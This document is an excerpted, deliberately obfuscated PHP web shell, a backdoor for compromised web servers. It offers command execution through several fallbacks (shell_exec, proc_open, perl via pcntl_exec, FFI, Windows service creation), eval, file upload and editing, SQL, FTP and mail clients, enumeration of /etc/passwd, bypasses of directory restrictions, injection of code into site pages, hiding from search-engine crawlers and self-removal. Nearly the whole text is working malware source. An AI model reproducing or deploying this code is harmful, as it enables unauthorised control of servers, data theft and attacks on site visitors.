...
function z3c($i, $t)
{
    if ($t != 'd' && $t != 'f' && $t != 'l' && $t != 'e') return '';
    if ($t == 'l' || $t == 'e') $t = 'f';
    $cs = z9w('reg_self');
    $ci = z9w('reg_interesting');
    $cb = z9w('reg_bad');
    if ($t == 'f' && $i == @basename(__FILE__)) return (($cs != '') ? ' style="color: ' . $cs . '";' : '');
    foreach (z7x('6', $t) as $r) {
        if (@preg_match('/' . $r . '/i', $i)) return (($ci != '') ? ' style="color: ' . $ci . '";' : '');
    }
    foreach (z7x('7', $t) as $r) {
        if (@preg_match('/' . $r . '/i', $i)) return (($cb != '') ? ' style="color: ' . $cb . '";' : '');
    }
}
...
function z9u()
{
    if (@isset($_SERVER['HTTP_USER_AGENT'])) {
        if (@preg_match('/' . @implode('|', z7x(3, "agents")) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
            @header(z7x(3, "send_header"));
            exit(0);
        }
    }
}
...
function z9s($k, $w = '', $u = 0)
{
    ...
    $l = z7x(2, "language");
    $r = '';
    if (!isset($lang[$l][$k])) return "?";
    $r = $lang[$l][$k];
    if ($w !== '') {
        if (@is_array($w)) {
            for ($i = 0; $i < @count($w); $i++) {
                if (@isset($w[$i])) $r = @str_replace("[%" . ($i + 1) . "%]", $w[$i], $r);
            }
        } else {
            $r = @str_replace("[%1%]", $w, $r);
        }
...
function z9i($i)
{
    foreach (["a" => "4", "e" => "3", "o" => "0", "s" => "5", "l" => "1", "t" => "7"] as $k => $v) {
        $i = @str_replace([$k, @strtoupper($k)], $v, $i);
    }
    return $i;
}
...
function z6k()
{
    ...
    $tmp = [];
    $tp = [];
    $tn = ['/tmp/', '/dev/shm/', '/var/tmp/'];
    $tw = ["%WINDIR/temp/"];
    $ti = [@ini_get('session.save_path'), @ini_get('upload_tmp_dir')];
    $te = ['TMP', 'TMPDIR', 'TEMP'];
    if ($win) {
        foreach ($tw as $t) $tp[] = $t;
    } else {
        foreach ($tn as $t) $tp[] = $t;
    }
    if (@isset($_ENV)) {
        foreach ($te as $t) {
            if (!@empty($_ENV[$t])) $tp[] = @realpath($_ENV[$t]);
        }
    }
    foreach ($ti as $t) {
        if (!@empty($t)) $tp[] = $t;
...
function z9o($f, $t = '')
{
    global $tempdir;
    $s = '';
    if (!$t) $t = @tempnam($tempdir, "copytemp");
...
function z4r($v)
{
    ...
    if (@is_bool($v)) return $value ? 'TRUE' : 'FALSE';
...
function z9t($c, $h = 1)
{
    ...
    if (!empty($c)) {
        if (z7r('shell_exec')) {
            ...
            @pclose($f);
        } elseif (z7r('proc_open') && @is_resource($f = @proc_open($c, [1 => ["pipe", "w"]], $p))) {
            if (z7r('fread') && z7r('feof')) {
                while (!@feof($p[1])) {
                    $r .= @fread($p[1], 1024);
                }
        ...
        if (!$win) {
            if (extension_loaded('perl')) {
                ...
                if ($pid == -1) {
                    ...
                    $c = [" -e 'system(\"$c > $o\")'"];
                    if (@pcntl_exec('/usr/bin/perl', $c)) exit(0);
                    if (@pcntl_exec('/usr/local/bin/perl', $c)) exit(0);
                    die();
                }
                $r = z9p($o);
                @unlink($o);
            ...
            if (extension_loaded('ffi')) {
                ...
                while (!@file_exists($o)) sleep(1);
                $r = z9p($o);
            } elseif (extension_loaded('win32service')) {
                $s = uniqid('NJ');
                @win32_create_service(['service' => $s, 'display' => $s, 'path' => 'c:\\windows\\system32\\cmd.exe', 'params' => "/c " . z6l($c) . " >\"$o\""]);
...
function z4m($c, $i)
{
    $a = ['0' => ['container', 'login', 'footer', 'headnfo', 'ql', 'nav', 'sinfo', 'tfilter', 'tahex', 'phpinfo'], '1' => ['list1', 'list2'], '2' => ['lerror', 'topcf', 'topt', 'topc', 'tdfooter', 'tdql', 'tdsinfo', 'tdlsh1', 'tdlsh2', 'tdlsf', 'tdlsfn', 'tdfilter', 'tdhead', 'tdph', 'tdpl', 'tdlbl', 'thex1', 'thex2', 'thex3', 'tdlsf1', 'tdmail'], '3' => ["scroll", "selector", "divls", "dwidth", "barbg", "barfil"], '4' => ['size1', 'size2', 'size3', 'size4', 'size5', 'size6', 'size7', 'size8', 'size9', 'size10'], '5' => ['links', 'slinks', 'button', 'head', 'ql1', 'ql2', 'but1', 'but2', 'but3', 'fimg', 'dirlist', 'filelist', 'ftactive', 'ftcompat', 'ftother', 'qlback', 'mbut1', 'mbut2', 'actbut'], '6' => ['console', 'tgeneric', 'tedit', 'txmail', 'tsql1', 'tsql2', 'tinj'],];
...
function z10t($i)
{
    ...
    $a = ['border-top:0;', 'border-bottom:0;', 'border-left:0;', 'border-right:0;', 'width: 50%;', 'width: 33%;', 'border-left: 1px solid #DDDDDD;', 'text-align: right !important;', 'width: 150px !important;', 'margin-left: 0 !important;'];
    $r = '';
    if (@strlen($i) > 1) {
...
function z3e($a = [])
{
    if (@isset($a['backf'])) return z2s($a);
    $r = '';
    foreach ($a as $k => $v) {
        $r .= (@is_numeric($k) ? $v . '=' . @urlencode(z8g($v)) : $k . '=' . @urlencode(z8g($k, $v))) . '&';
    }
    if ($r != '') $r = z9b('merged', @base64_encode($r));
    return $r;
}
...
function z3b()
{
    ...
    $www .= z9c(1) . z5c(['act' => 'phpinfo', 'd'], z8v("PHP/" . $b[0], '0'));
    echo z10e(z7i(z7l(z7o('http://whois.domaintools.com/' . $saddr, '1', 'POST') . z8v(z9s("4"), '0') . z9z() . z9c(5) . z7o('http://www.domaintools.com/research/traceroute/?query=' . $saddr, '1', 'POST') . z8v(z9s("5"), "0") . z9z(), '6', '5') . z7e(z5c(['act' => 'selfremove', 'd'], z8v(z9s("6"), '0')) . z9c(5) . z5c(['act' => 'logout', 'd'], z8v(z9s("7"), '0')), '6', '5')), '6');
...
<body' . (($act == "cmd") ? ' onload="document.command.cmd.focus();"' : '') . '>' . (@in_array($act, ['ls', 'search', 'ftp']) ? z3n() : '') . ($act == "f" && @isset($ft) && $ft == "edit" ? z1c() : '') . '
...
{
    global $nogradient;
    if (@isset($nogradient) && $nogradient) return 'background: ' . (($d == '') ? $s : $e) . ';';
...
{
    $tc = '';
    foreach (z7x(5, 'skins') as $s) $tc .= z5c(['act', 'd', 'color_skin' => $s], z4p(z0g(z9w("topbg1"), "11", @strtoupper($s))) . " ");
...
function z0u($n)
{
    if (@isset($_SESSION[$n])) unset($_SESSION[$n]);
}
...
function z2c($dir)
{
    ...
    if (z7r('glob')) {
        ...
        foreach ($safeDirArr as $item) echo @htmlspecialchars("{$item}") . "\r\n";
...
function z3s($dir)
{
    if (z7r('realpath')) {
        ...
        foreach ($safeDirArr as $item) {
            if (!@in_array($item, $rlpArr)) echo @htmlspecialchars($item) . "\r\n";
        }
        @error_reporting($error_reporting);
    }
}
        ...
        for ($i = 0; $i < 65535; $i++) {
            ...
            if ($a && @is_array($a)) {
                if (@isset($a['name']) && !@empty($a['name']) && !@isset($u[$a['name']])) {
                    $u[$a['name']] = [$a['uid'], $a['gid'], $a['dir'], $a['shell']];
                }
            }
        }
    }
...
function z9r($m, $s = 0)
{
    ...
    $w["w"] = ($c["w"]) ? "w" : "-";
    $w["x"] = ($c["x"]) ? "x" : "-";
    if ($m & 0x800) $o["x"] = ($o["x"] == "x") ? "s" : "S";
    if ($m & 0x400) $g["x"] = ($g["x"] == "x") ? "s" : "S";
    if ($m & 0x200) $w["x"] = ($w["x"] == "x") ? "t" : "T";
...
{
    $p = '';
    $k = ['80' => 'Webserver', '443' => 'OpenSSL', '3306' => 'MySQL', '5432' => 'PostgreSQL',];
...
function z4i($inj, $w, $f)
{
    ...
    switch ($w) {
        ...
        case 'html4':
            ...
            break;
        case 'body1':
            if (!@preg_match('/<body[^>]*>/', $c, $m)) return false;
            $p = @strpos($c, $m[0]);
            $r = @substr($c, 0, $p) . $inj . @substr($c, $p);
            break;
        case 'body2':
...
{
    global $act;
    return z6x(z5c(['act' => $ac, 'd', 'sort'], z8v($n, ($a ? '4' : '5'), ($act == $ac && $b ? ' style="border-right:0;"' : ''))), '5');
}
...
function z0o($k)
{
    if (!@isset($_SESSION[$k]) || !@is_array($_SESSION[$k])) {
        z0u($k);
        $_SESSION[$k] = [];
        $_SESSION[$k][] = ['act' => z7x('2', 'default_act')];
    }
}

function z2l($k)
{
    if (@count($_SESSION[$k]) > 0) return @count($_SESSION[$k]);
    $_SESSION[$k][] = ['act' => z7x('2', 'default_act')];
...
{
    $cleanp = z0c();
    if ($cleanp != z3d($k)) $_SESSION[$k][] = $cleanp;
}
...
function z0s()
{
    ...
    echo z7s(z7i(z5d('hist') . z8r(z9s("24"), "ls", (@in_array($act, ["ls", "d", "f", "dfunc"]))) . z8r(z9s("25"), "search", ($act == "search")) . z8r(z9s("26"), "upload", ($act == "upload")) . (($sh_exec || $safe_exec) ? z8r(z9s("27"), "cmd", ($act == "cmd")) : '') . z8r(z9s("28"), "eval", ($act == "eval")) . ($bftp ? z8r(z9s("193"), "ftp", ($act == "ftp")) : '') . z8r(z9s("29"), "sql", ($act == "sql")) . ($bmail ? z8r(z9s("30"), "mailer", ($act == "mailer")) : '') . z8r(z9s("31"), "encoders", ($act == "encoders")) . z8r(z9s("32"), "tools", ($act == "tools")) . ($sh_exec ? z8r(z9s("33"), "processes", ($act == "processes")) : '') . z8r(z9s("34"), "sysinfo", (@in_array($act, ["sysinfo", "phpinfo"]))) . z8r("&nbsp;", false, "")), '4');
}
...
function z1i($t)
{
    $t = @str_replace('\\', '/', $t);
    if (@strstr($t, '//')) {
        while (@strstr($t, '//') !== false) $t = @str_replace('//', '/', $t);
    }
    return $t;
}
...
function z1a($t)
{
    ...
    if (@preg_match('/[^\/\r\n"\']+\/\.\.\//', $t)) $t = @preg_replace('/[^\/\r\n"\']+\/\.\.\//', '', $t);
    if ($t == '/../') $t = '/';
    if ($t != './' && @strstr($t, './') !== false) $t = @str_replace('./', '', $t);
    return $t;
}

function z3q($f, $t, $c)
{
    if (@strstr($c, $f)) while (@strstr($c, $f)) $c = @str_replace($f, $t, $c);
    return $c;
}
...
function z1d($action)
{
    ...
    foreach (@range("B", "Z") as $let) {
        if ($let . ":" != @strtoupper($e[0]) && z4q($let . ":/")) {
            $r .= z5c(["act" => $action, "d" => @strtoupper($let) . ":/"], z8v("[$let]", "1")) . z9c(2);
        }
    }
    return $r;
}
...
function z4a($n, $a = [], $c = '', $g = '', $s = '')
{
    return z1j($n, $a, $c, $g, '1', $s);
}

function z2u($n, $a = [], $c = '', $g = '', $s = '')
{
...
function z8j($t = 0)
{
    ...
    foreach ($a as $k => $v) {
        $i++;
        $n .= z5c(($t === 0 ? ['act' => 'ls', 'd' => $k] : ($t == 'l' ? ['act' => 'ftp', 'd' => $k] : ['act' => 'ftp', 'd', 'ftp_current_dir' => $k])), z8v($v, '1') . (($v != '/' && $i != $c) ? ' / ' : ' '));
    }
    echo z10e(z7i(z7l((!$t ? z5c(['act' => 'ls', 'd' => z3p(__FILE__)], z8n('small_home', '', '9')) . z9c() . z1d("ls") : '') . $n . (!$t ? ' (' . z6y(z9r(@fileperms($d)), z6h($d)) . ')' : ''))), '5');
}

function z2z()
{
    global $d;
    echo z2b(z10e(z7i(z6x(z5c(['act' => 'f', 'd'], z8e(z9s("35")) . z6i('f', $d, '0') . z4a('ft', ['functions' => z9s("74"), 'edit' => z9s("75"), 'new' => z9s("195")], '1') . z8v('&raquo;', '7')), '') . z6x(z5c(['act' => 'd', 'dold' => $d], z8e(z9s("36")) . z6i('d', $d, '0') . z4a('dt', ['chdir' => z9s("425"), 'new' => z9s("195")], '1') . z8v('&raquo;', '7')), '')), '2'), '');
}
...
function z4d($pn, $t = 'f')
{
    ...
    if (@substr($l, -$pnl) == " " . $pn) {
        ...
        if (@count($p2) > 5) {
            ...
            if (@is_numeric($ps)) $ps = z7c($ps);
            $pd = '';
            for ($i = $st; $i < @count($p2); $i++) $pd .= $p2[$i] . ' ';
            $pd = @trim($pd);
            if (z7r('strtotime') && ($s2t = @strtotime($pd)) !== false) $pd = @date("Y-m-d H:i", $s2t);
            if ($pp[0] == "l") {
                return [$pn, 'LINK', $pd, [$pu, $pg], $pp];
            } elseif ($pp[0] == "d") {
                return [$pn, 'DIR', $pd, [$pu, $pg], $pp];
            } else {
                return [$pn, $ps, $pd, [$pu, $pg], $pp];
            }
        }
    }
    return ['', '', '', ['', ''], ''];
...
function z4t()
{
    ...
    $f_a = ['all' => z9s("37"), 'dirs' => z9s("38"), 'files' => z9s("39"), 'archives' => z9s("40"), 'exes' => z9s("41"), 'php' => z9s("42"), 'html' => z9s("43"), 'text' => z9s("44"), 'images' => z9s("45"), 'other' => z9s("46")];
    $fs = '';
    foreach ($f_a as $fk => $f) $fs .= z5c(['act', 'd', 'showbuf', 'filter' => $fk], z8v($f, (((@isset($filter) && $filter == $fk) || (!@isset($filter) && $fk == 'all')) ? '17' : '16')));
    $ba = z5c(['act', 'd', 'use_buffer' => ($use_buffer ? '0' : '1')], z8v(($use_buffer ? z9s("50") : z9s("49")), '16'));
    if ($use_buffer && (@count($bcopy) > 0 || @count($bcut) > 0)) {
        $bbcopy = (@count($bcopy) > 0);
        $bbcut = (@count($bcut) > 0);
        $ba .= z5c(['act' => 'ls', 'd', 'emptybuf' => '1'], z8v(z9s("51"), '16')) . ((!@isset($showbuf) || !$showbuf) ? z5c(['act' => 'ls', 'd', 'showbuf' => '1'], z8v(z9s("52"), '16')) . ($bbcopy ? z5c(['act' => "d", 'd', 'dt' => 'bpastecopy', 'showbuf'], z8v(z9s("54"), '16')) : '') . ($bbcut ? z5c(['act' => "d", 'd', 'dt' => 'bpastecut', 'showbuf'], z8v(z9s("55"), '16')) : '') . (($bbcopy && $bbcut) ? z5c(['act' => "d", 'd', 'dt' => 'bpasteall', 'showbuf'], z8v(z9s("56"), '16')) : '') : z5c(['act' => 'ls', 'd'], z8v(z9s("53"), '16')));
    }
    if (!@isset($lswf)) $lswf = '';
    echo z10e(z7i(z6x($fs . z5c(['act', 'd', 'showbuf', 'use_images' => ($use_images ? '0' : '1')], z8v(($use_images ? z9s("48") : z9s("47")), '16')) . $ba, '11')), '7');
}
...
function z0h($f, $t = '', $d = 0)
{
    ...
    if (@isset($reg_archives) && $reg_archives != '') {
        if (@preg_match('/\.(' . $reg_archives . ')$/', $f, $m)) {
            if (@isset($m[1])) {
                if ($m[1] != "zip" || ($m[1] == "zip" && $nix && $sh_exec)) $a['extract'] = z9s("478", $m[1]);
                if ($m[1] == "zip" && $bziparchive) $a['extractzip'] = z9s("478", "zip (php)");
            }
        }
    }
    ...
    $a['delete'] = z9s("72");
    if (!@isset($external) || !$external) $a['rename'] = z9s("73");
    $a['download'] = z9s("76");
    return z5c(['act' => 'f', 'f' => $f, 'd' => $d, 'showbuf'], z4a('ft', $a, '3') . z8v('&raquo;', '6'), $t);
}
...
function z0m($tt, $t = '')
{
    ...
    if ($use_buffer && (!@isset($with_ls) || !$with_ls)) {
        ...
        if (!@isset($showbuf) || !$showbuf) {
            if (@count($bcopy) > 0) $a['bpastecopy'] = z9s("54");
            if (@count($bcut) > 0) $a['bpastecut'] = z9s("55");
            if (@count($bcopy) > 0 && @count($bcut) > 0) $a['bpasteall'] = z9s("56");
        }
    }
    $a['rename'] = z9s("73");
    $a['delete'] = z9s("72");
    return z5c(['act' => 'd', 'd', 'tt' => $tt, 'showbuf'], z4a('dt', $a, '3') . z8v('&raquo;', '6'), $t);
}

function z1y($d, $t)
{
    return z5c(['act' => 'd', 'd' => $d], z4a('dt', ['chdir' => z9s("425")], '3') . z8v('&raquo;', '6'), $t);
}

function z0w($d)
{
    return z5c(['act' => 'ftp', 'flsort', 'ffsort', 'd' => $d], z4a('chdir', ['' => z9s("425")], '3') . z8v('&raquo;', '6'));
}

function z0q($t)
{
    return z5c(['act' => 'ftp', 'flsort', 'ffsort', 'd', 'rd' => $t], z4a('ft', ['chdir' => z9s("425")], '3') . z8v('&raquo;', '6'));
}

function z0t($t)
{
    return z5c(['act' => 'ftp', 'flsort', 'ffsort', 'd', 'lt' => $t], z4a('ft', ['upload' => z9s("197"), 'delete' => z9s("199")], '3') . z8v('&raquo;', '6'));
}

function z0r($t)
{
    return z5c(['act' => 'ftp', 'flsort', 'ffsort', 'd', 'rt' => $t], z4a('ft', ['download' => z9s("198"), 'delete' => z9s("199")], '3') . z8v('&raquo;', '6'));
}

function z4q($t)
{
    if (z4e($t) || z4j($t) || z3j($t) || z0n($t) || z0v($t) || z5o($t)) return 1;
    return 0;
}
...
function z2r($f, $t)
{
    global $nix, $sh_exec;
    if (@file_exists($f)) {
        if ($t == 'f') return @is_file($f);
        if ($t == 'd') return @is_dir($f);
        if ($t == 'L') return @is_link($f);
        if ($t == 'r') return @is_readable($f);
        if ($t == 'w') return @is_writable($f);
        if ($t == 'x') return @is_executable($f);
    } elseif ($nix && $sh_exec) {
...
function z3g($t, $s)
{
    $l = @strlen($s);
    if (@substr($t, -$l) == $s) {
        while (@substr($t, -$l) == $s) $t = @substr($t, 0, (@strlen($t) - $l));
    }
    return $t;
}
...
function z2b($a, $s = '')
{
    $r = '';
    if (@is_array($a)) {
        for ($i = 0; $i < @count($a); $i++) $r .= z7l($a[$i], '12', (($i == 0) ? '2' . $s : (($i == (@count($a) - 1)) ? '3' . $s : $s)));
    } else {
        $r = z7l($a, '12', '23' . $s);
    }
    return z10e(z7i($r), '3');
...
function z1x($c, $e = '')
{
    ...
    if ($s == '') $s = $e;
    if (@in_array($s, ['db', 'sql', 'pl', 'cgi', 'c', 'cc', 'cpp', 'h', 'hpp', 'icl', 'ipp'])) {
    ...
    $c = @str_replace(['<font color="', '</font>'], ['<span style="color: ', '</span>'], $c);
    $c = @preg_replace('/(\r|\n)/', '', $c);
...
{
    $r = '';
    for ($i = 0; $i < @strlen($p); ++$i) $r .= "\\x" . @sprintf('%02X', @ord($p[$i]));
...
function z2v()
{
    ...
    $tmin_arr = ["" => "Min"];
    $tsec_arr = ["" => "Sec"];
    foreach (["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"] as $tmm) $tmonth_arr[$tmm] = $tmm;
    for ($i = 1; $i <= 31; $i++) $tday_arr[$i] = $i;
    for ($i = 1998; $i <= @date("Y"); $i++) $tyear_arr[$i] = $i;
    for ($i = 1; $i <= 24; $i++) $thour_arr[$i] = $i;
    for ($i = 1; $i < 60; $i++) {
        $tmin_arr[$i] = $i;
        $tsec_arr[$i] = $i;
    }
...
function z2j()
{
    ...
    $r = '';
    $a = ['functions' => z9s("74"), 'edit' => z9s("75"), 'text' => z9s("79"), 'code' => z9s("80"), 'html' => z9s("81"), 'htmls' => z9s("82"), 'exe' => z9s("83"), 'sess' => z9s("84"), 'sdb' => z9s("85"), 'ini' => z9s("86"), 'img' => z9s("87"), 'hex' => z9s("88")];
    if (($wwwdir = z3k()) !== false) {
    ...
    $fta = z4s($f);
    foreach ($a as $k => $v) {
        if ($k != 'exe' || ($k == 'exe' && $sh_exec)) $r .= z7l(z5c(['act' => 'f', 'd', 'f', 'ft' => $k], z8v($v, (($ft == $k) ? '12' : ((@in_array($k, $fta)) ? '13' : '14')))));
    }
    echo z7s(z7i($r));
}
                    ...
                    foreach ($spaths as $spath) {
                        ...
                        if (@count($tglob) > 0) {
                            foreach ($tglob as $tfile) {
                                if (!@in_array($tfile, $ar_f)) $ar_f[] = $tfile;
                            }
                        }
                    }
                    unset($spaths);
...
function z0b($return = false)
{
    ...
    foreach ($sections as $section) {
        ...
        foreach ($askapache as $m) $pi[$n][$m[1]] = (@isset($m[2]) && (!@isset($m[3]) || $m[2] == $m[3])) ? $m[2] : @array_slice($m, 2);
    }
        ...
        if (!@empty($m)) {
            ...
            foreach ($e as $l) {
                if (@preg_match('/mem:\s*([0-9]+)\s*([0-9]+)\s*([0-9]+)/i', $l, $t)) {
                    ...
                    $mem = [z2g($used), z9s("426", z7c($t[1])) . " " . z9s("429", z7c($t[2])) . " (" . $used . "%) " . z9s("465", z7c($t[3]))];
                } elseif (@preg_match('/swap:\s*([0-9]+)\s*([0-9]+)\s*([0-9]+)/i', $l, $t)) {
                    $used = @round(($t[2] / $t[1]) * 100);
                    $swap = [z2g($used), z9s("426", z7c($t[1])) . " " . z9s("429", z7c($t[2])) . " (" . $used . "%) " . z9s("465", z7c($t[3]))];
                } elseif (@preg_match('/-\/\+ buffers\/cache:\s*([0-9]+)\s*([0-9]+)/i', $l, $t)) {
                    $tot = ($t[1] + $t[2]);
                    $used = @round(($t[1] / $tot) * 100);
                    $buff = [z2g($used), z9s("426", z7c($tot)) . " " . z9s("429", z7c($t[1])) . " (" . $used . "%) " . z9s("465", z7c($t[2]))];
                }
            }
        }
    }
    return [$mem, $buff, $swap];
}
...
function z9e()
{
    ...
    $r = [[z2g($used), z9s("426", $dtotal) . " " . z9s("429", $dused) . " (" . $used . "%) " . z9s("465", $dfree)]];
    if ($win && z7r('disk_free_space') && z7r('disk_total_space')) {
        ...
        foreach (@range("B", "Z") as $let) {
            if (z4q($let . ":/")) {
                ...
                $tr[$let . ":"] = [z2g($pused), z9s("426", z7c($total)) . " " . z9s("429", z7c($used)) . " (" . $pused . "%) " . z9s("465", z7c($free))];
            }
        }
        if (@count($tr) !== 0) $r = $tr;
    } elseif ($nix && $sh_exec) {
        ...
        if (!@empty($df)) {
            ...
            foreach ($e as $l) {
                ...
                $tr[$p[5]] = [z2g($used), z9s("426", z7c($p[1])) . " " . z9s("429", z7c($p[2])) . " (" . $used . "%) " . z9s("465", z7c($p[3])) . " FS: " . $p[0]];
            }
            if (@count($tr) !== 0) $r = $tr;
        }
    }
...
{
    global $passarray;
    if (!@isset($passarray)) $passarray = [];
    if (!@isset($passarray[$user])) $passarray[$user] = [];
    $f = z9p($file);
    if (!empty($f)) {
...
function z2y($file, $possible = 0, $replace = 0)
{
    ...
    foreach ($knownfunc as $type => $funcs) {
        ...
        foreach ($funcs as $func) {
            if (@strstr($cleanct, $func)) $score++;
        }
        $foundp = @round(($score / $count) * 100);
        if ($score >= $min) {
            if ($replace) $replaced = " : " . (z2q($file) ? z9s("290") : z9s("291"));
...
function z3v($s, $t = 0)
{
    ...
    if ($t) return @preg_match('/^' . $reg . '$/i', $s);
    $r = [];
    if (@preg_match_all('/' . $reg . '/i', $s, $m)) {
        foreach ($m[0] as $em) $r[] = $em;
    }
    return @array_unique($r);
}

function z1r($a, $s = " and", $f = [])
{
    if (!@is_array($a)) $a = [];
    $r = "";
    foreach ($a as $k => $v) {
...
function z0d()
{
    ...
    $as_fd = ['1' => z9s("144"), '2' => z9s("145"), '' => z9s("146")];
    $a_rec = ['' => z9s("21")];
    for ($i = 0; $i < 10; $i++) $a_rec[($i + 1)] = ($i + 1) . " " . z9s("145");
    $a_rec['no'] = z9s("22");
    $a_paths = ['cwd' => 'cwd', 'system' => 'system', 'bin' => '(s)bin dirs', 'etc' => '/etc'];
    echo z5c(['d', 'act' => 'search', 'ftarget' => '1'], z10e(z9f(z9j(z10e(z7i(z5t(z9s("143")) . z9j(z6i("sn", @htmlspecialchars($sn), '2') . z4a("s_fd", $as_fd, '1', '1') . z4a("s_rec", $a_rec, '1', '1') . z6p("submit", z9s("147"), '7') . ' ' . z5y('sn_reg', z9s("148"), 'sn_reg'))) . z7i(z5t(z9s("149")) . z9j(z6i("s_in", htmlspecialchars($s_in), "9")))) . z10e(z7i(z5t(z9s("150")) . z9j(z6i("st", @htmlspecialchars($st), "9"))) . z7i(z5t("") . z9j(z5y("st_reg", z9s("151"), "st_reg") . z9c("3") . z5y("st_wwo", z9s("152"), "st_wwo") . z9c("3") . z5y("st_cs", z9s("153"), "st_cs") . z9c("3") . z5y("st_not", z9s("154"), "st_not"))))))));
    echo z6d();
    if ($nix && $sh_exec) {
        echo z2b(z9s("155")) . z6d();
        global $findaliases, $unixfind, $find_text, $find_in_dir, $find_in_files, $find_defined, $spath, $lsman;
        if (!@isset($spath)) $spath = 'cwd';
        $find_result = "";
        ...
        echo z5c(['d', 'act' => 'search', 'unixfind' => '1'], z10e(z7i(z5t(z9s("156")) . z9j(z6i("find_text", @htmlspecialchars($find_text), '0') . z8v(z9s("147"), '7'))) . z7i(z5t(z9s("149")) . z9j(z6i("find_in_dir", @htmlspecialchars($find_in_dir), "9"))) . z7i(z5t(z9s("157")) . z9j(z6i("find_in_files", @htmlspecialchars($find_in_files), "9")))));
        echo z5c(['d', 'act' => 'search', 'unixfind' => '2'], z10e(z7i(z5t(z9s("158")) . z9j(z2u("find_defined", $findaliases, "0", '1') . z4a('spath', $a_paths, '1', '1') . z8v(z9s("147"), '7') . z5y("lsman", z9s("159"), 'lsman', '1')))));
        echo z6d();
        ...
        if (!@empty($find_result)) {
            if (@isset($lsman) && $lsman) {
                ...
                foreach ($tls_a as $ls) {
                    $ls = @trim($ls);
                    if (!@empty($ls) && !@in_array($ls, $ls_a)) $ls_a[] = $ls;
                }
                if (@count($ls_a) > 0) {
                    $act = "ls";
                    $fullpath = 1;
...
class my_sql
{
    ...
    function list_dbs()
    {
        ...
        switch ($this->db) {
            case 'MySQL':
                ...
                while ($tmprow = @mysql_fetch_object($this->res)) $tmplist[$tmprow->Database] = $tmprow->Database;
                break;
            case 'MSSQL':
                break;
            case 'PostgreSQL':
        ...
        switch ($this->db) {
            case 'MySQL':
                ...
                if ($this->num_fields) {
                    ...
                    if (@count($this->columns) < 1) $this->get_columns();
    ...
    function get_num_rows()
    {
        ...
        switch ($this->db) {
            ...
            case 'PostgreSQL':
                ...
                break;
            case 'Oracle':
                while (false !== (@oci_fetch_assoc($this->res))) $this->num_rows++;
                break;
        }
    }
        ...
        switch ($this->db) {
            case 'MySQL':
                for ($i = 0; $i < $this->num_fields; $i++) {
                    if (@mysql_field_name($this->res, $i) !== false) $this->columns[] = @mysql_field_name($this->res, $i);
                }
                break;
            case 'MSSQL':
                for ($i = 0; $i < $this->num_fields; $i++) {
                    if (@mssql_field_name($this->res, $i) !== false) $this->columns[] = @mssql_field_name($this->res, $i);
                }
                break;
            case 'PostgreSQL':
                for ($i = 0; $i < $this->num_fields; $i++) {
                    if (@pg_field_name($this->res, $i) !== false) $this->columns[] = @pg_field_name($this->res, $i);
                }
                break;
            case 'Oracle':
                for ($i = 0; $i < $this->num_fields; $i++) {
                    if (@ocicolumnname($this->res, $i) !== false) $this->columns[] = @ocicolumnname($this->res, $i);
                }
                break;
        }
    }
    ...
    {
        if (!$this->query('SELECT * FROM `' . $table . '` LIMIT 0,1;')) return 0;
...
class ftp
{
    ...
    {
        if ($dir) @ftp_chdir($this->connection, $dir);
...
if (@isset($_GET['act']) && $_GET['act'] == "i") {
    ...
    if (!@isset($_GET['getall'])) {
        ...
        if (@empty($images[$img])) {
            if (@isset($_GET['exe']) && $_GET['exe']) $img = "cmd";
        }
        @ob_start();
        $len = @strlen($image);
        ...
        $n = 1;
        $r = '';
        foreach ($k as $u) $r .= z7i(z9j(($n++)) . z9j($u) . z9j('<img alt="" src="?act=i&img=' . $u . '" border="0">'));
        echo z10e($r);
        z3x();
    }
    exit();
...
foreach ($_POST as $postk => $postv) {
    ...
    if ($postk == 'merged') {
        parse_str(base64_decode($postv), $ar_merged);
...
if (!@isset($act)) $act = z7x('2', 'default_act');
if ($act == "logout") z4y();
z4g();
$win = $nix = $linux = 0;
$os = z9a();
if (@preg_match("/^win/i", $os)) {
    ...
    $nix = 1;
    if (@preg_match("/linux/i", $os)) $linux = 1;
}
$sh_exec = $safe_exec = 0;
...
if ($bmysql) $a_sql[] = "MySQL";
$bmssql = z7r("mssql_connect");
if ($bmssql) $a_sql[] = "MsSQL";
$boracle = z7r("ocilogon");
if ($boracle) $a_sql[] = "Oracle";
$bpostgres = z7r("pg_connect");
if ($bpostgres) $a_sql[] = "PostgreSQL";
$bpasswd = 0;
if ($nix) {
    if (z0n("/etc/passwd")) $bpasswd = 1;
}
...
$a_buf = ['bcopy', 'bcut'];
$b_buf = ['bpastecopy', 'bpastecut', 'bpasteall'];
if (!@isset($use_buffer)) {
...
if ($nix && $sh_exec) {
    ...
    if (!@isset($reg_archives)) {
        if (@isset($_SESSION['reg_archives'])) {
            ...
            $reg_archives = '';
            if (!@empty($cmd_unrar)) $reg_archives .= "rar|";
            if (!@empty($cmd_unzip)) $reg_archives .= "zip|";
            if (!@empty($cmd_tar) && !@empty($cmd_gunzip)) $reg_archives .= "tar.gz|tgz|";
            if (!@empty($cmd_tar) && !@empty($cmd_bunzip2)) $reg_archives .= "tar.bz2|";
            if (!@empty($cmd_tar)) $reg_archives .= "tar|";
            if (!@empty($cmd_gunzip)) $reg_archives .= "gz|";
            if (!@empty($cmd_bunzip2)) $reg_archives .= "bz2|";
            if (!@empty($reg_archives)) $reg_archives = @substr($reg_archives, 0, (@strlen($reg_archives) - 1));
        }
    }
    ...
    if (!@isset($reg_archives)) {
        if (@isset($_SESSION['reg_archives'])) {
            ...
            if (@empty($reg_archives)) {
                ...
                if (!@in_array("zip", $r_e)) $reg_archives .= "|zip";
            }
        } else {
            $reg_archives = 'zip';
        }
        ...
        switch ($abuf) {
            ...
            case 'bpastecut':
                if (@isset($bcut) && @is_array($bcut) && @count($bcut) > 0) {
                    foreach ($bcut as $tcf) {
                        if (z4q($tcf)) z8a($tcf, z1a($d) . (z4j($tcf) ? z2h($tcf) : ''));
                        z1l($tcf, "bcut");
                    }
                }
                break;
            case 'bpasteall':
                if (@isset($bcopy) && @is_array($bcopy) && @count($bcopy) > 0) {
                    foreach ($bcopy as $tcf) {
                        if (z4q($tcf)) z7b($tcf, z1a($d) . (z4j($tcf) ? z2h($tcf) : ''));
                    }
                }
                if (@isset($bcut) && @is_array($bcut) && @count($bcut) > 0) {
                    foreach ($bcut as $tcf) {
...
if (@isset($rendirmsg) && !@empty($rendirmsg)) echo $rendirmsg;
if (@isset($showrename1) && $showrename1) {
